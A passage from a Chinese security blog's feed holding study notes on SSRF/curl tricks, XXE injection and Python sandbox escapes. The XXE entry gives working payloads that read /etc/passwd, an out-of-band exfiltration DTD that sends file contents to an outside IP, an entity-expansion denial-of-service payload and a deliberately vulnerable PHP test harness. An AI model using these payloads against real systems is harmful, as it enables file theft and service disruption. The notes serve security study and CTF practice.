CURLOPT_SAFE_UPLOAD, false);</code>，之后就可以url=@index.php实现curl读取本地文件读取</p></li><li><p>curl支持拼接命令<code>curl http://xxx/{2222.jpg,flag.php}</code></p></li><li><p>curl里面，如果使用file协议的话，不管host是什么，都会尝试在本地的path中寻找，所以能用用file读取本地文件时对host检查是没用的，比如lctf的签到题</p><p>​</p></li></ul><h2 id="ssrf中支持的协议及相关用途"><a href="#ssrf中支持的协议及相关用途" class="headerlink" title="ssrf中支持的协议及相关用途"></a>ssrf中支持的协议及相关用途</h2><p>待补，整理猪猪侠的16年乌云白帽大会+网上的协议介绍</p><h2 id="ssrf出现场景及攻击思路"><a href="#ssrf出现场景及攻击思路" class="headerlink" title="ssrf出现场景及攻击思路"></a>ssrf出现场景及攻击思路</h2><p>待补，整理猪猪侠的16年乌云白帽大会</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LCTF里好多涉及到服务端对url进行处理的问题啊，也暴露出了自己对这一块知识的严重欠缺，ssrf也做过些笔记，但总感觉还不足以专门写东西发出来，通过在LCTF中的一些知识点收集以及自己的一些搜索，感觉在服务端的URL处理这块已经比较全面了，故做下整理，虽然现在认识还很浅，以后慢慢补充吧，保持更新~&lt;/p&gt;
&lt;p&gt;顺便膜一下orange大大，orange师傅在blackhat上的议题再一次刷新了自己对一名真正的黑客的认知，这里就不奢望能达到orange师傅的水平了，只是希望自己能在以后的安全路上时时警醒自己，一名真正的安全从业人员应该是什么样的。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XXE注入攻击</title>
    <link href="https://someonesometimes.github.io/2017/11/16/XXE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>https://someonesometimes.github.io/2017/11/16/XXE注入攻击/</id>
    <published>2017-11-16T12:32:55.000Z</published>
    <updated>2017-11-17T01:41:26.739Z</updated>
    
    <content type="html"><![CDATA[<p>听说XXE漏洞已经荣登OWASP榜了？看来是时候把之前的XXE学习笔记拿出来翻新一波了。。。</p><a id="more"></a><h2 id="XXE攻击的场景以及用途"><a href="#XXE攻击的场景以及用途" class="headerlink" title="XXE攻击的场景以及用途"></a>XXE攻击的场景以及用途</h2><p>在一切对XML文件进行解析的场景中，都有可能出现XXE注入。像XML文件作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为<user><name>Yiruma</name></user>处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点<br>说到XXE攻击的常见用途有：实现任意文件读取，重复定义引用（仿递归）攻击，内网探测，更多可用攻击手法都基于实体中可以使用的协议，这个后面会介绍到</p><h2 id="XXE产生的原因"><a href="#XXE产生的原因" class="headerlink" title="XXE产生的原因"></a>XXE产生的原因</h2><p>在有对XML文件进行解析的地方，如果使用了不安全的XML解析函数如php的simplexml_load_string()，对外部实体进行了解析下，就有可能引入不安全的参数，从而造成攻击。</p><h2 id="XML文档结构学习"><a href="#XML文档结构学习" class="headerlink" title="XML文档结构学习"></a>XML文档结构学习</h2><p>XML文档结构包括XML声明，DTD文档类型定义，文档元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--XML申明--&gt;</span></div><div class="line">&lt;?xml version="1.0"?&gt; </div><div class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></div><div class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</div><div class="line">]&gt;</div><div class="line"><span class="comment">&lt;!--文档元素--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure><p>当然，重点学习对象就是DTD部分，攻击就是从这里产生的</p><h4 id="DTD学习"><a href="#DTD学习" class="headerlink" title="DTD学习"></a>DTD学习</h4><p>一个DTD中的实体由两种属性组成——参数/非参数实体+内部/外部实体</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbgy1flk7u8dbs5j20hp06wq35.jpg" alt=""></p><p>其中参数实体只能在DTD内部以<code>%实体名</code>的方式引用，而非参数实体则可在XML文档元素，也就是XML的第三个部分以<code>&amp;实体名</code>的方式引用</p><p>内部实体一般定义字符串这些，而外部实体可以使用如下的协议，可以看到这里面有很多危险的协议，我们要做的就是突破限制来使用这些协议来达到我们的目的</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flk7yozjvxj20g905yq44.jpg" alt=""></p><p>来看几个例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">这是一个内部实体+参数实体，参数在XML文档文档元素部分引用，不能使用协议</div><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">    &lt;!ENTITY name "nMask"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></div></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">这是一个外部实体+非参数实体，参数在XML文档DTD内部引用，可以使用外部协议</div><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</div><div class="line">    %name;</div><div class="line">]&gt;</div></pre></td></tr></table></figure><h2 id="XXE注入的几种姿势"><a href="#XXE注入的几种姿势" class="headerlink" title="XXE注入的几种姿势"></a>XXE注入的几种姿势</h2><h4 id="能够直接回显的"><a href="#能够直接回显的" class="headerlink" title="能够直接回显的"></a>能够直接回显的</h4><p>这种能够回显的，直接写一个参数+外部实体然后调用就好了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></div></pre></td></tr></table></figure><h4 id="不能直接回显的，Blind-XXE"><a href="#不能直接回显的，Blind-XXE" class="headerlink" title="不能直接回显的，Blind XXE"></a>不能直接回显的，Blind XXE</h4><p>首先在vps中建立evil.dtd</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://118.89.16.36/x/?id=%file;'&gt;"</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure><p>然后xml中书写如下形式<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://118.89.16.36/evil.dtd"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p><h4 id="过滤了ENTITY关键字"><a href="#过滤了ENTITY关键字" class="headerlink" title="过滤了ENTITY关键字"></a>过滤了ENTITY关键字</h4><p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，之后就是同样的姿势了</p><p>（本地测试没有成功，可能是姿势问题）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE svg SYSTEM "http://118.89.16.36/evil.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div><div class="line"></div><div class="line">evil.dtd</div><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></div></pre></td></tr></table></figure><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p>这个文件里面存在11111个实体引用，超出了合法的实体引用数量上限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY a0 "dos" &gt;</div><div class="line">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</div><div class="line">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</div><div class="line">&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;</div><div class="line">&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a4;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure><h2 id="搭建本地测试环境"><a href="#搭建本地测试环境" class="headerlink" title="搭建本地测试环境"></a>搭建本地测试环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="string">&lt;&lt;&lt;XML</span></div><div class="line">//书写XML文档</div><div class="line">XML;</div><div class="line"><span class="comment">//注：在高版本php中对外部实体的解析默认关闭了，所以下面要这样写来启用</span></div><div class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</div><div class="line">$data=simplexml_load_string($a, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>参考文章:</p><p><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="external">DTD/XXE 攻击笔记分享 | FreeBuf</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">浅谈XXE漏洞攻击与防御 | nMask’s Blog</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说XXE漏洞已经荣登OWASP榜了？看来是时候把之前的XXE学习笔记拿出来翻新一波了。。。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python沙盒的几种绕过方式</title>
    <link href="https://someonesometimes.github.io/2017/11/16/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    <id>https://someonesometimes.github.io/2017/11/16/python沙盒绕过/</id>
    <published>2017-11-16T03:05:18.000Z</published>
    <updated>2018-04-30T09:55:11.959Z</updated>
    
    <content type="html"><![CDATA[<p>对python沙盒的编写以及现有几种常见的沙盒绕过策略的一点总结</p><a id="more"></a><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="内建名称空间-builtins"><a href="#内建名称空间-builtins" class="headerlink" title="内建名称空间 __builtins__"></a>内建名称空间 <code>__builtins__</code></h3><p>在启动Python解释器之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，这些函数就是内建函数，并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始</p><p>名称空间在python是个非常重要的概念，只得是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间</p><ul><li>内建名称空间</li><li>全局名称空间</li></ul><p>这里我们主要关注的是内建名称空间，是名字到内建对象的映射，，在python中，初始的<code>__builtins__</code>模块提供内建名称空间到内建对象的映射</p><p>dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'base64'</span>, <span class="string">'os'</span>]</div></pre></td></tr></table></figure><p>这里面，我们可以看到<code>__builtins__</code>是做为默认初始模块出现的，那么用dir()命令看看<code>__builtins__</code>的成分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</div><div class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</div></pre></td></tr></table></figure><p>从里面我们可以看到一些我们经常用到的函数：open(),eval(),len(),<code>__import__</code>,以及我们刚才用的dir()函数，还有我们要用的一些对象诸如list,dict,tuple,int,float这些，然后还有一些异常啥的。当然，这里面最关键的就是<code>__import__</code>了，可以使用import函数的话，就可以导入任意模块了。</p><h3 id="python中的类继承，两个魔术方法，全局变量"><a href="#python中的类继承，两个魔术方法，全局变量" class="headerlink" title="python中的类继承，两个魔术方法，全局变量"></a>python中的类继承，两个魔术方法，全局变量</h3><p><strong>类继承</strong></p><p>python中对一个变量应用<code>__class__</code>方法从一个变量实例转到对应的对象类型后，类有以下两种关于继承关系的方法</p><ul><li><code>__base__</code>  对象的一个基类，也就是”最父类的类”——object</li><li><code>__mro__</code> 同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</li><li><code>__subclasses__()</code>  继承此对象的子类，返回一个列表</li></ul><p>有这些类继承的方法，我们就可以从任何一个变量，顺藤摸瓜到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类啦，当然，这些类还只是直接继承object的，如果我们顺着子类往下摸说不定还能找到更多</p><p><strong>两个魔术方法</strong></p><p>第一个是类具有的——<code>__dict__</code>魔术方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 首先使用dir看下[]里支持的方法，属性等</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir([])</div><div class="line">[<span class="string">'__add__'</span>,.....省略..... <span class="string">'__subclasshook__'</span>, <span class="string">'append'</span>, <span class="string">'count'</span>, <span class="string">'extend'</span>, <span class="string">'index'</span>, <span class="string">'insert'</span>, <span class="string">'pop'</span>, <span class="string">'remove'</span>, <span class="string">'reverse'</span>, <span class="string">'sort'</span>]</div><div class="line"></div><div class="line"><span class="comment"># 在将[]实例转化为class类型后，我们就可以使用class这个类的__dict__方法，以字典的格式列出来这个类中所支持的方法，属性</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__</div><div class="line">dict_proxy(&#123;<span class="string">'__getslice__'</span>: &lt;slot wrapper <span class="string">'__getslice__'</span> of <span class="string">'list'</span> objects&gt;, <span class="string">'__getattribute__'</span>: &lt;slot wrapper <span class="string">'__getattribute__'</span> of <span class="string">'list'</span> objects&gt;, <span class="string">'pop'</span>: &lt;method <span class="string">'pop'</span> of <span class="string">'list'</span> objects&gt;, <span class="string">'remove'</span>: &lt;method <span class="string">'remove'</span> of <span class="string">'list'</span> objects&gt;, .......省略...... <span class="string">'__hash__'</span>: <span class="keyword">None</span>, <span class="string">'__ge__'</span>: &lt;slot wrapper <span class="string">'__ge__'</span> of <span class="string">'list'</span> objects&gt;&#125;)</div><div class="line"></div><div class="line"><span class="comment"># 通过__dict__来间接选用append方法</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">'append'</span>]</div><div class="line">&lt;method <span class="string">'append'</span> of <span class="string">'list'</span> objects&gt;</div><div class="line"><span class="comment"># 然后尝试调用，第一个对应append方法的实例对象，第二个为方法的参数（哎，和java的反射好像啊，莫非这就是反射？）</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">'append'</span>](a, <span class="string">'firstEle'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> a</div><div class="line">[<span class="string">'firstEle'</span>]</div></pre></td></tr></table></figure><p>第二个是实例、类、函数都具有的——<code>__getattribute__</code>魔术方法</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"># 通过dir()看下实例，类，函数里的情况，都能看到__getattribute这个魔术方法的存在</div><div class="line">&gt;&gt;&gt; dir([])               #实例</div><div class="line">&gt;&gt;&gt; dir([].__class__)     #类</div><div class="line">&gt;&gt;&gt; dir([].append)        #函数</div><div class="line"></div><div class="line">先介绍在函数中的应用吧，这个魔术方法的绕过作用经常在函数中用到</div><div class="line"># 首先定位到一个函数上</div><div class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[72]            #定位到类</div><div class="line">&lt;class 'site._Printer'&gt;</div><div class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[72].__init__   #定位到__init__函数</div><div class="line">&lt;unbound method _Printer.__init__&gt;</div><div class="line"># 还是用dir看下函数里支持的内容，可以看到__getattribute__这个方法是支持的，另外多嘴一句：</div><div class="line"># 怎么看一个东西是函数，是对象呢，函数中总会支持__call__方法，而对象没有，可以通过这点来判断</div><div class="line">&gt;&gt;&gt; dir([].__class__.__base__.__subclasses__()[72].__init__)</div><div class="line">['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__format__', '__func__', '__get__', '__getattribute__', '__hash__', '__init__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'im_class', 'im_func', 'im_self']</div><div class="line"># 通过__getattribute__方法，我们可以获得到函数中所支持的所有属性,当然目的就是要调用__init__函数中的__globals__啦</div><div class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[72].__init__.__getattribute__('__globals__')</div><div class="line"></div><div class="line">然后介绍在实例中的应用</div><div class="line">&gt;&gt;&gt; a = []</div><div class="line"># 这里做个小对比，第一个是a的append方法，所以显示是个内建方法，第二个是list类的append所以显示的与前一个不同，第二个在调用的时候还需要指定好调用这个方法的对象</div><div class="line">&gt;&gt;&gt; a.__getattribute__('append')    </div><div class="line">&lt;built-in method append of list object at 0x057D93F0&gt;</div><div class="line">&gt;&gt;&gt; a.__class__.append</div><div class="line">&lt;method 'append' of 'list' objects&gt;</div><div class="line">&gt;&gt;&gt; a.__getattribute__('append')('firstEle')</div><div class="line">&gt;&gt;&gt; a.__class__.append(a,'secondEle')</div><div class="line">&gt;&gt;&gt; print a</div><div class="line">['firstEle', 'secondEle']</div><div class="line"></div><div class="line">最后介绍在类中的应用，其实还是实例上的应用，其产生的结果与__dict__不同,目前感觉用处不大</div><div class="line"># 首先测试使用__dict__调用[].__class__的__init__方法</div><div class="line">&gt;&gt;&gt; [].__class__.__dict__['__init__']</div><div class="line">&lt;slot wrapper '__init__' of 'list' objects&gt;</div><div class="line"># 再测试使用__getattribute__调用[].__class__的__init__方法</div><div class="line">&gt;&gt;&gt; [].__class__.__getattribute__([],'__init__')</div><div class="line">&lt;method-wrapper '__init__' of list object at 0x057D44B8&gt;</div><div class="line">可以看到第一个返回的是个方法，第二个返回一个实例空间的方法，实际我们在调用</div><div class="line">[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os']</div><div class="line">的时候，只有第一种方法获得的init，也就是&lt;slot wrapper '__init__' of 'list' objects&gt;类型的__init__，才具有__globals__。。</div></pre></td></tr></table></figure><p>了解上面这些是有些用处的，沙盒逃逸中有个很重要的方法就是：从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量  这个流程中，找到我们想要的模块或者函数，而上面的叙述一个是为了讲清为什么要用这个流程，另一方面就是介绍了两种魔术方法，能够以字符串的形式调用属性，提供了一些字符绕过的可能</p><h2 id="从沙盒编写中看沙盒逃逸思路"><a href="#从沙盒编写中看沙盒逃逸思路" class="headerlink" title="从沙盒编写中看沙盒逃逸思路"></a>从沙盒编写中看沙盒逃逸思路</h2><h3 id="通过删除内建空间中的成员来限制"><a href="#通过删除内建空间中的成员来限制" class="headerlink" title="通过删除内建空间中的成员来限制"></a>通过删除内建空间中的成员来限制</h3><p>比较典型的删除名单列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></div><div class="line">    UNSAFE = [<span class="string">'open'</span>,</div><div class="line">              <span 